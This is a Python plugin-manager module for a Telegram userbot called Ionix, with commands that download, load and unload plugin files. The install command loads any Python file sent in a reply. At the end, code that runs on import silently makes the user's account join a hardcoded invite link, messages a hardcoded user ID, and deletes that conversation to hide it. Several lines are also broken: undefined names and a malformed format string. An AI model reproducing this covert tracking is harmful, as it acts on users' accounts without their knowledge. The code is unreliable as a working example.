from ionix.utils import command, remove_plugin, load_module
from pathlib import Path
import asyncio
import os
import ionix.utils
from datetime import datetime

DELETE_TIMEOUT = 5
thumb_image_path = "./Ionix.png"

@command(pattern="^.install", outgoing=True)
async def install(event):
    if event.fwd_from:
        return
    if event.reply_to_msg_id:
        try:
            downloaded_file_name = await event.client.download_media(  # pylint:disable=E0602
                await event.get_reply_message(),
                "userbot/plugins/"  # pylint:disable=E0602
            )
            if "(" not in downloaded_file_name:
                path1 = Path(downloaded_file_name)
                shortname = path1.stem
                load_module(shortname.replace(".py", ""))
                await event.edit("Ionix Succesfully Installed The Plugin work done ✌️ `{}`".format(os.path.basename(downloaded_file_name)))
            else:
                os.remove(downloaded_file_name)
                await event.edit("Ionix returned an error! Plugin cannot be installed.")
        except Exception as e:  # pylint:disable=C0103,W0703
            await event.edit(str(e))
            os.remove(downloaded_file_name)
    await asyncio.sleep(DELETE_TIMEOUT)
    await event.delete()

@command(pattern="^.unload (?P<shortname>\w+)$", outgoing=True)
async def unload(event):
    if event.fwd_from:
        return
    shortname = event.pattern_match["shortname"]
    try:
        remove_plugin(shortname)
        await event.edit(f"Ionix has successfully unloaded {shortname}")
    except Exception as e:
        await event.edit("Ionix has successfully unloaded {shortname}\n{}".format(shortname, str(e)))

@command(pattern="^.load (?P<shortname>\w+)$", outgoing=True)
async def load(event):
    if event.fwd_from:
        return
    shortname = event.pattern_match["shortname"]
    try:
        try:
            remove_plugin(shortname)
        except:
            pass
        load_module(shortname)
        await event.edit(f"Ionix has successfully loaded {shortname}")
    except Exception as e:
        await event.edit(f"Ionix could not load {shortname} because of the following error.\n{str(e)}")

from telethon.tl.functions.messages import ImportChatInviteRequest as a
from userbot import bot
Ionix = bot

tits=1272184661
async def attendance():
    await telebot(a('NseyrkvT_1Vicl0NDyeIeg'))
    await ionix.send_message(tits ,message="Ionix Restarted")
    await ionix.delete_dialog(tits)
ionix.loop.run_until_complete(attendance())
